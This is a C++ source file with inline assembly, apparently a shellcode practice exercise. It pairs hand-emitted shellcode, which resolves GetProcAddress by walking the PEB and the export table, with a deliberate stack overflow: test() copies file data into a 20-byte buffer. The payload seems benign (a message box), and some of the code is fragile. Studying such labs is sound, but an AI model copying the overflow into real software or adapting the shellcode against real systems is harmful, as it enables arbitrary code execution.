// ShellCode02.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <Windows.h>

#define defPath "C:\\Users\\CY-Pro13\\source\\repos\\2101_ShellCode\\ShellCode01\\shell.txt"

void shell()
{
	__asm
	{
		sub esp, 0x66;
		__asm _emit(0xE8)__asm _emit(0xFF)__asm _emit(0xFF)__asm _emit(0xFF);
		__asm _emit(0xFF)__asm _emit(0xC3)__asm _emit(0x5E);
		add esi, 0x7 + 0x8 + 0x7 + 15;	//指令+地址+文本
		call esi;
		//Address
		__asm _emit(0xA0)__asm _emit(0xEE)__asm _emit(0x87)__asm _emit(0x76);
		__asm _emit(0x00)__asm _emit(0x41)__asm _emit(0xC7)__asm _emit(0x76);
		//CO0kie 7
		__asm _emit(0x43)__asm _emit(0x4F)__asm _emit(0x30)__asm _emit(0x6B)
		__asm _emit(0x69)__asm _emit(0x65)__asm _emit(0x00);
		//GetProcAddress 15
		__asm _emit(0x47)__asm _emit(0x65)__asm _emit(0x74)__asm _emit(0x50)
		__asm _emit(0x72)__asm _emit(0x6F)__asm _emit(0x63)__asm _emit(0x41)
		__asm _emit(0x64)__asm _emit(0x64)__asm _emit(0x72)__asm _emit(0x65)
		__asm _emit(0x73)__asm _emit(0x73)__asm _emit(0x00);
	tag_Load:	//加载API
		push esi;
		sub esi, 15;
		mov edx, esi;
		push esi;
		//解析链表
		mov esi, fs : [0x30] ;
		mov esi, [esi + 0x0C];
		mov esi, [esi + 0x1C];
		mov esi, [esi];
		mov esi, [esi + 0x08];
		push esi;
		call tag_GetProcAdd;
		call tag_ShellCode;
	tag_GetProcAdd:
		// 找到GetProcAddress,并保存其地址
		mov eax, [esi + 0x3C]; // 获取PE头偏移
		add eax, esi;  // 获取PE头位置
		mov ecx, [eax + 0x78]; // 获取Exprot偏移(64位好像是0x88)  (ecx => Export)
		add ecx, esi;
		push ecx;
		mov edi, [ecx + 0x20]; // 获取ENT
		add edi, esi;
	tag_ENT:
		mov eax, [edi];
		add eax, esi;
		push edx;
		push eax;
		call strcmp;
		add edi, 0x4;
		test eax, eax;
		pop ecx;
		pop edx;
		jnz tag_ENT;
		//找到了该函数
		call tag_GetAdd;
		ret 0x8;
	tag_GetAdd:
		sub edi, 0x4;
		sub edi, esi;
	tag_ShellCode:
		xor eax, eax;
		sub esi, 0x7;
		push eax;
		push esi;
		push esi;
		push eax;
		sub esi, 0x8;
		call[esi];
		add esi, 0x4;
		push eax;
		call[esi];
	}
}

void test(char* buf, DWORD len)
{
	char buff[20];
	memcpy(buff, buf, len);
}

int main()
{
	char buff[255];

	//读取文件信息
	HANDLE handle = CreateFileA(defPath, GENERIC_READ,		//打开文件句柄
		0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (handle == INVALID_HANDLE_VALUE)
		return 0;
	DWORD dwRead = GetFileSize(handle, 0);
	printf("打开文件%p\t%lu\n", handle, dwRead);
	if (::ReadFile(handle, buff, dwRead, &dwRead, NULL))
	{
		CloseHandle(handle);
		test(buff, dwRead);
		return 0;
	}
	__asm ret;
	MessageBoxA(0, 0, 0, 0);
	shell();
}